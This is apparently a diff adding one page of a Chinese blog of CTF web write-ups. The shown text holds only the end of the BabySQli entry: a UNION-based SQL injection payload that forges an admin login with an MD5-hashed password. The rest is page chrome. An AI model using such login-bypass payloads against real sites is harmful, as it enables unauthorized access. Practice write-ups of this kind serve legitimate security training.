+<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>在注释中有提示：<code>select * from user where username = &#39;$name&#39;</code><br>username：1’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#<br>password：123</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.697Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/02/20/adhlix/&title=《BUU-WEB（一）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/02/20/adhlix/&title=《BUU-WEB（一）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/02/20/adhlix/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《BUU-WEB（一）》 — yichen's blog&url=https://yichen115.github.io/2020/02/20/adhlix/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/02/20/adhlix/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/02/22/pzhqyf/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Linux系统</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/02/19/heis24/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">curl使用</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/02/20/adhlix/&title=《BUU-WEB（一）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/02/20/adhlix/&title=《BUU-WEB（一）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/02/20/adhlix/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《BUU-WEB（一）》 — yichen's blog&url=https://yichen115.github.io/2020/02/20/adhlix/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/02/20/adhlix/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/02/20/adhlix/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
